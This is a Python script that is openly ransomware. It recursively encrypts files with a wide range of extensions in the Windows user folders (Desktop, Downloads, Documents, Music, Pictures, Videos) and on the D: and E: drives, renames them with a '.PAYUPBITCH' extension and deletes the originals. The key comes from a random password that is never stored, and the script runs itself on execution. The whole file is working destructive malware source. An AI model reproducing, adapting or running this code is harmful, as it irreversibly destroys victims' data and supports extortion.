import os, base64, string, random
from cryptography.fernet import Fernet as f
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

#region Functions
def password(passwd):
    
    password = passwd.encode() # Convert to type bytes
    salt = b'salt_' # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
    kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=default_backend()
            )
    k = base64.urlsafe_b64encode(kdf.derive(password))
    return k



def enc_fun(key,file):
    try:
        with open(file,"rb") as fname:
            data = fname.read()
        fl,ext = os.path.splitext(file)
        fkey = f(key)
        enc = fkey.encrypt(data)
        with open(str(fl[0:])+ext+'.PAYUPBITCH','wb') as encfile:
            encfile.write(enc)
        os.remove(file)
    except:
        pass


def dec_fun(key,file):
    try:        
        with open(file, "rb") as fname:
            data = fname.read()
        fkey = f(key)
        fl,ext = os.path.splitext(file)
        dec = fkey.decrypt(data)
        with open(str(fl[0:]), 'wb') as decfile:
            decfile.write(dec)
        os.remove(file)
    
    except:
        pass
#endregion

# Encrypt C: Items, Desktop, Downloads, Documents, Pictures etc...
def C_drive_desktop():
    userdir = f'C:\\Users\\{os.getlogin()}\\Desktop'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        #Mac/Linux system directory
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        #Windows system directory
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            
            C_drive_downloads()
        else:
            shit = 420
    else:
        shit = 420

def C_drive_downloads():
    userdir = f'C:\\Users\\{os.getlogin()}\\Downloads'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        #Mac/Linux system directory
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        #Windows system directory
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            
            C_drive_documents()
        else:
            shit = 420
    else:
        shit = 420

def C_drive_documents():
    userdir = f'C:\\Users\\{os.getlogin()}\\Documents'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        #Mac/Linux system directory
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        #Windows system directory
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            
            C_drive_music()
        else:
            shit = 420
    else:
        shit = 420

def C_drive_music():
    userdir = f'C:\\Users\\{os.getlogin()}\\Music'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        #Mac/Linux system directory
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        #Windows system directory
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            
            C_drive_pictures()
        else:
            shit = 420
    else:
        shit = 420

def C_drive_pictures():
    userdir = f'C:\\Users\\{os.getlogin()}\\Pictures'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        #Mac/Linux system directory
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        #Windows system directory
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True

            C_drive_videos()
        else:
            shit = 420
    else:
        shit = 420

def C_drive_videos():
    userdir = f'C:\\Users\\{os.getlogin()}\\Videos'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        #Mac/Linux system directory
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        #Windows system directory
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            
            D_drive()
        else:
            shit = 420
    else:
        shit = 420


# Try to encrypt D: drive
def D_drive():
    userdir = f'D:\\'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        #Mac/Linux system directory
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        #Windows system directory
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            
            E_drive()
        else:
            shit = 420
    else:
        E_drive()
        shit = 420


# Try to encrypt E: drive
def E_drive():
    userdir = f'E:\\'
    listOfFiles = list()

    file_input = userdir
    if os.path.exists(file_input):
        if file_input !="":
            import time
            characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
            length = 30
            
            passwd = ''
            for c in range(length):
                passwd += random.choice(characters)

            start = time.time()
            if os.path.isfile(file_input)==False:
                for (dirpath, dirnames, filenames) in os.walk(file_input):
                    EXCLUDE_DIRECTORY = (
                        #Mac/Linux system directory
                        '/usr',  
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        #Windows system directory
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'logs',
                    )
                    if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                        pass
                    else:
                        listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                        for l in listOfFiles:
                            EXTENSIONS = (
                                '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                        
                                '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                
                                '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                '.java', '.class', '.jar', # java source code
                                '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                        
                                '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                            )
                            if l.endswith(EXTENSIONS):
                                import threading
                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                x.start()
                                x.join()
            else:
                enc_fun(password(passwd),file_input)

            finshed = True
            
        else:
            shit = 420
    else:
        shit = 420

# Try to encrypt F: drive


C_drive_desktop()
